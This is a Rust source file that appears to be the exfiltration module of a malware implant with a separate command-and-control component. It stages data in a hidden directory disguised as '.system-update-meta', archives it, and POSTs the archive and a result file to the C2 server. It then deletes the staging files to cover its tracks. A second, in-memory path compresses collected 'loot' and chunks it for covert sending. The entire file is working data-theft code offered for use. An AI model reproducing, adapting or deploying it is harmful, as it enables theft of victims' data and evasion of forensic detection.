/// Exfiltration.
///
/// Two modes:
///   tar_dir_and_send() — fork tar -czf, read archive, POST, optional cleanup (tier1/2)
///   pack_and_chunk()   — in-memory tar+gzip via flate2 (tier3)

use flate2::write::GzEncoder;
use flate2::Compression;
use std::fs;
use std::io::{self, Write};
use std::process::Command;

use crate::config::Config;
use crate::c2;

/// Shell-based tar + POST (tier1/2).
/// Tars staging_dir/.system-update-meta/, POSTs with result.json.
/// If config.cleanup_staging: rm -rf staging_dir after.
pub fn tar_dir_and_send(config: &Config, result_json: &str, staging_dir: &str) -> io::Result<()> {
    let archive = format!("{}/exfil.tar.gz", staging_dir);

    // Build result.json at staging root
    fs::write(format!("{}/result.json", staging_dir), result_json)?;

    // tar -czf the meta dir
    let _ = Command::new("tar")
        .args(["-czf", &archive, "-C", staging_dir, ".system-update-meta"])
        .output();

    // POST result.json + archive
    if let Ok(json_data) = fs::read(format!("{}/result.json", staging_dir)) {
        if let Ok(tar_data) = fs::read(&archive) {
            let _ = c2::exfil_multipart(config, &json_data, &tar_data);
        }
    }

    // Cleanup
    let _ = fs::remove_file(&archive);
    if config.cleanup_staging {
        let _ = Command::new("rm").args(["-rf", staging_dir]).output();
    }

    Ok(())
}

// ── In-memory tar + gzip (tier3) ──────────────────────────────────

fn tar_entry(name: &str, data: &[u8]) -> Vec<u8> {
    let mut header = [0u8; 512];
    let name_bytes = name.as_bytes();
    let name_len = name_bytes.len().min(100);
    header[..name_len].copy_from_slice(&name_bytes[..name_len]);
    header[100..108].copy_from_slice(b"0000644\0");
    header[108..116].copy_from_slice(b"0000000\0");
    header[116..124].copy_from_slice(b"0000000\0");
    let size_str = format!("{:011o}", data.len());
    header[124..135].copy_from_slice(size_str.as_bytes());
    header[136..148].copy_from_slice(b"00000000000\0");
    for b in &mut header[148..156] { *b = b' '; }
    header[156] = b'0';
    header[257..263].copy_from_slice(b"ustar\0");
    let mut chk: u32 = 0;
    for (i, &b) in header.iter().enumerate() {
        chk += if i >= 148 && i < 156 { b' ' as u32 } else { b as u32 };
    }
    let chk_str = format!("{:06o}\0", chk);
    header[148..155].copy_from_slice(chk_str.as_bytes());

    let mut entry = Vec::with_capacity(512 + data.len() + pad_len(data.len()));
    entry.extend_from_slice(&header);
    entry.extend_from_slice(data);
    entry.extend(std::iter::repeat(0u8).take(pad_len(data.len())));
    entry
}

fn pad_len(data_len: usize) -> usize {
    let rem = data_len % 512;
    if rem == 0 { 0 } else { 512 - rem }
}

fn build_tar(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut tar = Vec::new();
    for (name, data) in entries {
        tar.extend_from_slice(&tar_entry(name, data));
    }
    tar.extend(std::iter::repeat(0u8).take(1024));
    tar
}

/// In-memory tar + gzip + chunked (tier3).
pub fn pack_and_chunk(loot: &[(&str, &[u8])]) -> Vec<Vec<u8>> {
    let tar = build_tar(loot);
    let mut gz = GzEncoder::new(Vec::new(), Compression::best());
    gz.write_all(&tar).expect("gzip write");
    let compressed = gz.finish().expect("gzip finish");
    compressed.chunks(4096).map(|c| c.to_vec()).collect()
}
